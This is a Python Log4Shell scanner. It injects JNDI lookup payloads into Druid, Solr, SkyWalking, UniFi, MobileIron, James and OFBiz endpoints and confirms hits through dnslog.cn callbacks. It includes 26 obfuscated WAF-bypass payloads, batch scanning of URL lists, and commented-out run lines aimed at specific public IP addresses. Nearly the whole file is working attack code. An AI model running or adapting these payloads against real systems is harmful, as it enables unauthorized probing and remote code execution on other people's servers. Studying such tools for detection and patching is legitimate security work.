# coding=utf-8
import requests 
import time
import urllib
import random
import logging
import os
import string
import platform
import sys
import argparse

# 获取dnslog domain


def getdomain():
    url = "http://www.dnslog.cn/getdomain.php"  # 设置url
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "Referer": "http://www.dnslog.cn/"
    }
    try:
        print("[\033[34mINFO\033[0m] 正在请求dnslog地址")
        res = requests.get(url = url, headers = headers)
        print("[\033[34mINFO\033[0m] 获取到dnslog地址: " + res.text)
        return res.text, res.cookies['PHPSESSID']
    except:
        exit("[\033[31mERROR\033[0m] 无法连接到dnslog.cn")

# 获取数据


def getrecords(cookie, flag):
    url = "http://www.dnslog.cn/getrecords.php"  # 设置url
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "Referer": "http://www.dnslog.cn/",
        "Cookie": "PHPSESSID=" + cookie
    }
    res = requests.get(url = url, headers = headers)
    islog = False
    if(flag in res.text):
        islog = True
    return islog

# 生成随机字符串


def random_str(randomlength=16):
    random_str = ''
    base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
    length = len(base_str) - 1
    for i in range(randomlength):
        random_str += base_str[random.randint(0, length)]
    return random_str

# druid and solr


def ds_run(mod, dns_cookie, url, dns_domain, isbypass):
    urllist = {
        "druid": (
            url + r"druid/coordinator/" + "this-payload",
            url + r"druid/indexer/" + "this-payload",
            url + r"druid/v2/" + "this-payload"
        ),
        "solr": (
            url + r"solr/admin/collections?action=" + "this-payload" + r"&wt=json",
            url + r"solr/admin/info/system?_=" + "this-payload" + r"&wt=json",
            url + r"solr/admin/cores?_=&action=&config=&dataDir=&instanceDir=" + "this-payload" + r"&name=&schema=&wt=",
            url + r"solr/admin/cores?action=CREATE&name=" + "this-urlencode-payload" + r"&wt=json"
        )
    }
    runlist = ["" for i in range(100)]
    last = 1
    if isbypass == False:
        payload = r"${jndi:ldap://" + "flag_random." + dns_domain+r"}"
        if mod == "druid":
            last = 3
            runlist = [
                url + r"druid/indexer/" + payload,
                url + r"druid/coordinator/" + payload,
                url + r"druid/v2/" + payload
            ]
        else:
            last = 4
            runlist = [
                url + r"solr/admin/collections?action=" + payload + r"&wt=json",
                url + r"solr/admin/info/system?_=" + payload + r"&wt=json",
                url + r"solr/admin/cores?_=&action=&config=&dataDir=&instanceDir=" + payload + r"&name=&schema=&wt=",
                url + r"solr/admin/cores?action=CREATE&name=" + payload + r"&wt=json"
            ]
    else:
        last = 0
        log_addr = "flag_random."+dns_domain
        for i in range(26):
            payload = payload_bypass[i].replace("127.0.0.1/poc", log_addr)
            for j in range(3):
                if "this-payload" in urllist[mod][j]:
                    runlist[last] = urllist[mod][j].replace("this-payload", payload)
                else:
                    runlist[last] = urllist[mod][j].replace("this-urlencode-payload", urllib.parse.urlencode(payload))
                last += 1

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "Referer": url
    }
    #res = requests.get(url=url,headers=headers,proxies=proxies)
    for i in range(last):
        flag_random = random_str()
        runlist[i] = runlist[i].replace("flag_random", flag_random)
        try:
            print("[\033[34mINFO\033[0m] 正在测试: " + runlist[i])
            req = urllib.request.Request(url = runlist[i], headers = headers, method = "GET")
            urllib.request.urlopen(req)
            time.sleep(0.5)
            if getrecords(dns_cookie, flag_random):
                return runlist[i]
        except:
            time.sleep(0.5)
            if getrecords(dns_cookie, flag_random):
                return runlist[i]
    return "nolog4shell"

# skywalking , unifi-network and mobileIron user portal

def sn_run(mod, dns_cookie, url, dns_domain, isbypass):
    last = 0
    if isbypass == False:
        last = 1
    else:
        last = 26
    for i in range(last):
        flag_random = random_str()
        payload = payload_bypass[i].replace("127.0.0.1/poc", flag_random + "." + dns_domain)
        addr = {
            "sky": url + "graphql",
            "unifi": url + "api/login",
            "mobileiron": url + "mifs/j_spring_security_check"
        }
        data = {
            "sky": "{\n    \"query\":\"query queryLogs($condition: LogQueryCondition) {\n  queryLogs(condition: $condition) {\n    total\n    logs {\n      serviceId\n      " + payload + "\n      serviceName\n      isError\n      content\n    }\n  }\n}\n\",\n    \"variables\":{\n        \"condition\":{\n            \"metricName\":\"test\",\n            \"state\":\"ALL\",\n            \"paging\":{\n                \"pageSize\":10\n            }\n        }\n    }\n}",
            "unifi": "{\"username\":\"admin\",\"password\":\"admin\",\"remember\":\"" + payload + "\",\"strict\":true}",
            "mobileiron": "j_username=" + payload + "&j_password=admin&logincontext=employee"
        }
        headers = {
            "sky": {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "close",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Referer": url
            },
            "unifi": {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0",
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate",
                "Referer": url + "manage/account/login",
                "Content-Type": "application/json; charset=utf-8",
                "Connection": "close",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin"
            },
            "mobileiron": {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                "Accept-Encoding": "gzip, deflate",
                "Referer": url,
                "Content-Type": "application/x-www-form-urlencoded",
                "Connection": "close",
                "Cookie": "JSESSIONID=409B933794586CB8A83636DF202A9196",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-User": "?1"
            }
        }
        try:
            requests.post(url = addr[mod], headers = headers[mod], data = data[mod], verify = False)
            if getrecords(dns_cookie, flag_random):
                return addr[mod], data[mod]
        except:
            if getrecords(dns_cookie, flag_random):
                return addr[mod], data[mod]
        
    return "nolog4shell", "nolog4shell"

# james

def jo_run(mod, dns_cookie, url, dns_domain, isbypass):
    last = 1
    if isbypass == True:
        last = 26
    if platform.system() == "Windows":
        curl_addr = os.path.dirname(os.path.abspath(__file__)) + "\\curl\\windows\\bin\\curl.exe"
    elif platform.system() == "Linux":
        curl_addr = "./curl/linux/curl"
        os.system("chmod 777 ./curl/linux/curl")
    cmd = {
        "james": curl_addr + " --url \"smtp://" + "target-url" + "\" --user \"test:test\" --mail-from '" + "this-payload" + "@gmail.com' --mail-rcpt 'test' --upload-file email.txt -o curl_tmp",
        "ofbiz": curl_addr + " --insecure -H \"Cookie: OFBiz.Visitor=\\" + "this-payload" + "\" " + "target-url" + "myportal/control/main -o curl_tmp"
    }
    for i in range(last):
        flag_random = random_str()
        payload = payload_bypass[i].replace("127.0.0.1/poc", flag_random + "." + dns_domain)
        cmd_run = (cmd[mod].replace("target-url", url)).replace("this-payload", payload)
        print("[\033[34mINFO\033[0m] 正在调用curl: " + cmd_run)
        os.system(cmd_run)
        # print("\n")
        try:
            os.remove("curl_tmp")
        except:
            print("[\033[31mWARNING\033[0m] 删除临时文件出错")
        if getrecords(dns_cookie, flag_random) == True:
            return cmd_run
    return "nolog4shell"

def run(mod, url, isbypass = False):
    dns_domain, dns_cookie = getdomain()
    if(mod == "druid" or mod == "solr"):
        print("[\033[34mINFO\033[0m] 正在测试: " + url + " " + mod + "模式")
        result = ds_run(mod, dns_cookie, url, dns_domain, isbypass)
        if result == "nolog4shell":
            print("[\033[1;34mINFO\033[0m] 该url未发现" + mod + " log4shell")
        else:
            print("[\033[1;34mINFO\033[0m] url有log4shell,payload为: \033[36m" + result + "\033[0m")
            return result
    elif(mod == "sky" or mod == "unifi" or mod == "mobileiron" or mod == "skywalking"): #unifi<=6.5.54 
        if mod == "skywalking":
            mod = "sky"
        print("[\033[34mINFO\033[0m] 正在测试: " + url + " " + mod + "模式")
        result_url, result_data = sn_run(mod, dns_cookie, url, dns_domain, isbypass)
        if(result_url == "nolog4shell" and result_data == "nolog4shell"):
            print("[\033[1;34mINFO\033[0m] 该url未发现" + mod + " log4shell")
        else:
            print("[\033[1;34mINFO\033[0m] url有log4shell,payload为: \033[36m" + result_url + "\nPOST: \n" + result_data + "\033[0m")
            return result_url + "\nPOST: \n" + result_data
    elif(mod == "james" or mod == "ofbiz"):
        print("[\033[34mINFO\033[0m] 正在测试: " + url + " " + mod + "模式")
        result = jo_run(mod, dns_cookie, url, dns_domain, isbypass)
        if result == "nolog4shell":
            print("[\033[1;34mINFO\033[0m] 该url未发现" + mod + " log4shell")
        else:
            print("[\033[1;34mINFO\033[0m] url有log4shell,payload为: \033[36m" + result + "\033[0m")
            return result
    else:
        print("[\033[31mERROR\033[0m] 不支持当前模式")




def format_url(url, mod):
    if mod != "james":
        try:
            if url[:4] != "http":
                url = "https://" + url
                url = url.strip()
            url = url.strip('/') + '/'
            return url
        except Exception as e:
            print("[\033[31mWARNING\033[0m] URL 错误 {0}".format(url)) 

def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description="本工具为log4j2某些项目漏洞扫描器，poc均为互联网收集")
    parser.add_argument('-u', '--url', type=str, help=' 目标URL(james模式为ip) ')
    parser.add_argument('-m', '--mod', type=str, help=' 攻击模式(目前支持druid,skywalking,james,solr,unifi,ofbiz,mobileIron,all) ')
    parser.add_argument('-f', '--file', type=str, help=' 文件路径 ')
    parser.add_argument('-i', '--isbypass', type=bool, help=' 是否bypass(True OR False 默认为False) ')


    args = parser.parse_args()

    url = args.url
    mod = args.mod
    file = args.file
    isbypass = False

    if args.isbypass in dir():
        isbypass = args.isbypass

    if url:
        print("[\033[34mINFO\033[0m] 测试开始，当前模式: " + mod + "单url模式")
        if mod == "all":
            for i in range(6):
                if run(mod_all[i], format_url(url, mod), isbypass):
                    exit()
        else:
            run(mod, format_url(url, mod), isbypass)
        
    elif file:
        if mod == "all":
            exit("[\033[31mERROR\033[0m] 文件模式下不支持all模式")
        print("[\033[34mINFO\033[0m] 测试开始，当前模式: " + mod + "文件模式")
        log_time = time.strftime("%Y_%m_%d_%H_%M_%S",time.localtime())
        log_addr = "./result/" + log_time + ".log"
        f = open(log_addr, 'a')
        for url_link in open(file, 'r'):
            if url_link.strip() != '':
                url_path = format_url(url_link.strip(), mod)
                f.write(run(mod, url_path, isbypass) + "\n")
        f.close()
        print("[\033[34mINFO\033[0m] 测试结束，结果保存在: " + log_addr)
    else:
        print("[\033[31mERROR\033[0m] 输入错误")


BANNER = """
    __            __ __       __         ____                          
   / ____  ____ _/ // / _____/ /_  ___  / / /     ______________ _____ 
  / / __ \/ __ `/ // /_/ ___/ __ \/ _ \/ / ______/ ___/ ___/ __ `/ __ \\
 / / /_/ / /_/ /__  __(__  / / / /  __/ / /_____(__  / /__/ /_/ / / / /
/_/\____/\__, /  /_/ /____/_/ /_/\___/_/_/     /____/\___/\__,_/_/ /_/ 
        /____/                                                           --by Nie(https://www.imnie.com)
""" 

payload_bypass = [
    r"${jndi:ldap://127.0.0.1/poc}",
    r"${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1/poc}",
    r"${${::-j}ndi:rmi://127.0.0.1/poc}",
    r"${${lower:jndi}:${lower:rmi}://127.0.0.1/poc}",
    r"${${lower:${lower:jndi}}:${lower:rmi}://127.0.0.1/poc}",
    r"${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://127.0.0.1/poc}",
    r"${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://127.0.0.1/poc}",
    r"${${aaa:bbb:-j}ndi:rmi://127.0.0.1/poc}",
    r"${${:::::::::-j}ndi:rmi://127.0.0.1/poc}",
    r"${${:p:q::zz::::::::-j}ndi:rmi://127.0.0.1/poc}",
    r"${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//127.0.0.1/poc}",
    r"${j${k8s:k5:-ND}i${sd:k5:-:}ldap://127.0.0.1/poc}",
    r"${j${k8s:k5:-ND}${sd:k5:-${123%25ff:-${123%25ff:-${upper:1}:}}}ldap://127.0.0.1/poc}",
    r"${jndi:ldaps://127.0.0.1/poc}",
    r"${jndi:iiop://127.0.0.1/poc}",
    r"${date:ldap://127.0.0.1/poc}",
    r"${java:ldap://127.0.0.1/poc}",
    r"${marker:ldap://127.0.0.1/poc}",
    r"${ctx:ldap://127.0.0.1/poc}",
    r"${lower:ldap://127.0.0.1/poc}",
    r"${upper:ldap://127.0.0.1/poc}",
    r"${main:ldap://127.0.0.1/poc}",
    r"${jvmrunargs:ldap://127.0.0.1/poc}",
    r"${sys:ldap://127.0.0.1/poc}",
    r"${env:ldap://127.0.0.1/poc}",
    r"${log4j:ldap://127.0.0.1/poc}"
]

mod_all = ["sky", "solr", "druid", "unifi", "ofbiz", "mobileiron"]

if __name__ == "__main__":
    if sys.version_info.major == 2:
        reload(sys)
        sys.setdefaultencoding('utf-8')
    logging.captureWarnings(True)
    main()
    # run("druid", "http://223.16.237.12:8888/", True)
    # run("solr", "http://140.82.62.103:8983/", True)
    # run("sky", "http://47.117.46.238:8089/", True)
    # run("unifi", "https://91.183.91.224:8443/", True)
    # run("unifi", "https://47.21.15.154:8443/", True)
    # run("james", "129.232.146.58", False)
    # run("mobileiron", "https://64.250.192.149/", False)
    # run("ofbiz", "https://54.244.78.120/", False)